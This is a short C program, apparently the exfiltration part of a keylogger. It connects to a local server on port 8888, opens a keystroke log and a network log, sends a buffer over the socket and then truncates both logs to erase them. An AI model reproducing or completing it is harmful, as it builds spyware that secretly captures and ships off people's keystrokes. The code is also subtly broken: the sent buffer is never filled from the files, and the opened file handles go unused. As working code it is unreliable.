#include <stdio.h>
#include <stdlib.h>
#include <string.h>       // strlen
#include <sys/socket.h>   // socket
#include <arpa/inet.h>    // inet_addr
#include <unistd.h>       // write
#include <fcntl.h>

int main(int argc , char *argv[])
{
    // Variables
    int sock, read_size, ret;
    struct sockaddr_in server;
    char message[3000];
    
    char *addr = "127.0.0.1";
    short port = 8888;
    
    // Create a socket. Return value is a file descriptor for the socket.
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Error creating socket\n");
        exit(0);
    }
    printf("Client socket created\n");
    
    // Set the server ip address, connection family and port
    server.sin_addr.s_addr = inet_addr(addr);
    server.sin_family      = AF_INET;
    server.sin_port        = htons(port);
    
    // Connect to remote server
    if (connect(sock, (struct sockaddr *) &server, sizeof(server)) < 0) {
        perror("Error establishing connection\n");
        close(sock);
        exit(0);
    }
    printf("Connecting to server...\n");
    
    /*Open keylog file for writing*/
    FILE *keylog_file = fopen("log/keylog.txt", "a");
    /*Write keylog file*/
    if ((ret = write(sock, message, strlen(message))) <= 0) {
        perror("Error writing\n");
        close(sock);
        exit(0);
    }
    /*Clear and close keylog file*/
    fclose(fopen("log/keylog.txt", "w"));
    
    /*Open network_log file for writing*/
    FILE *network_log = fopen("log/network.txt", "a");
    /*Write keylog file*/
    if ((ret = write(sock, message, strlen(message))) <= 0) {
        perror("Error writing network log\n");
        close(sock);
        exit(0);
    }
    /*Clear and close keylog file*/
    fclose(fopen("log/network.txt", "w"));
    
    close(sock);
    return 0;
}
